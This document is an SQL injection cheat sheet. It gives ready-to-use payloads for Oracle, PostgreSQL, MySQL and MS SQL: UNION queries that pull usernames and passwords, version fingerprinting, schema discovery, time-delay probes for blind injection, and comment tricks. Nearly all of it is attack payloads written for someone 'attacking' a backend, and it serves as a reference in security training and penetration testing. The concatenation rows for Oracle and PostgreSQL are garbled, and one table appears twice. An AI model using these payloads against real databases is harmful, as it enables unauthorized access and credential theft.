## 1. String Concatenation

_Use these when you need to combine multiple fields (like `username` and `password`) into a single display column._

|**Database**|**Syntax**|**Example Payload**|
|---|---|---|
|**Oracle**|`||
|**PostgreSQL**|`||
|**MySQL**|`CONCAT()`|`' UNION SELECT CONCAT(username, '~', password) FROM users--`|
|**MS SQL**|`+`|`' UNION SELECT username + '~' + password FROM users--`|
## 2. Database Version Detection

_Use these to identify which backend you are attacking._

|**Database**|**Query**|**Notes**|
|---|---|---|
|**Oracle**|`SELECT banner FROM v$version`|Requires `FROM dual`|
|**PostgreSQL**|`SELECT version()`||
|**MySQL**|`SELECT @@version`|Use `#` or `--` for comments|
|**MS SQL**|`SELECT @@version`||

|Database|Query|Notes|
|---|---|---|
|**Oracle**|`SELECT banner FROM v$version`|Requires `FROM dual`|
|**PostgreSQL**|`SELECT version()`||
|**MySQL**|`SELECT @@version`|Use `#` or `--` for comments|
|**MS SQL**|`SELECT @@version`||

---

## 3. Database Contents (Schema Discovery)

_Use these to find table and column names if you don't know them._

### Non-Oracle (MySQL, PG, MS SQL)

Most databases use the `information_schema`.

- **List all tables:** `' UNION SELECT table_name, NULL FROM information_schema.tables--`
    
- **List columns in a specific table:** `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'--`
    

### Oracle

Oracle uses its own metadata tables.

- **List all tables:** `' UNION SELECT table_name, NULL FROM all_tables--`
    
- **List columns in a specific table:** `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--`
    

---

## 4. Conditional Time Delays (Blind SQLi)

_Use these to confirm vulnerability when there is no visual output._

|Database|Syntax|
|---|---|
|**Oracle**|`dbms_pipe.receive_message(('a'),10)`|
|**PostgreSQL**|`SELECT pg_sleep(10)`|
|**MySQL**|`SELECT sleep(10)`|
|**MS SQL**|`WAITFOR DELAY '0:0:10'`|

---

## 5. Comments & Null Handling

_Crucial for fixing broken queries._

### Comment Syntax

- **MySQL:** `#` or `--` (Note the space after the dashes)
    
- **PostgreSQL:** `--`
    
- **MS SQL:** `--`
    
- **Oracle:** `--`
    

### The "Dual" Table Requirement

**Oracle** is strict: every `SELECT` must have a `FROM`. If you aren't pulling from a real table, you must use `FROM dual`.

- **Wrong:** `' UNION SELECT 'abc', 'def'--`
    
- **Right (Oracle):** `' UNION SELECT 'abc', 'def' FROM dual--`